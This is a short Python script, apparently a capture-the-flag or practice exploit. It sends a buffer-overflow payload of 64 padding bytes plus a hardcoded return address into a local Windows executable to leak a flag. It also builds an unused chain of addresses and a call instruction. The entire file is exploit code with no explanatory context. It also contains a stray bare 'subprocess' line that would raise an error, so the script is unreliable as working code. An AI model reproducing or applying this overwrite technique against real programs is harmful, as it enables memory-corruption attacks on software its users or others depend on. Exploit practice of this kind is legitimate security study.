from subprocess import Popen, PIPE, STDOUT


call_func = b"\xE8\x8d\x13\x40\x00"#0040138d
call_addr = b"\x89\x13\x40\x00"
message = b"\xc5\x12\x40\x00"

flag = b'\x57\x80\x40\x00'

leak_flag = call_func+message*12+b"aaaaaaaaaaa"+flag

subprocess
p = Popen(['C:\\Users\\Austin\\Documents\\tempProj.exe'], stdout=PIPE, stdin=PIPE, stderr=PIPE)
stdout_data = p.communicate(input=b"a"*64+flag)[0]
print(stdout_data)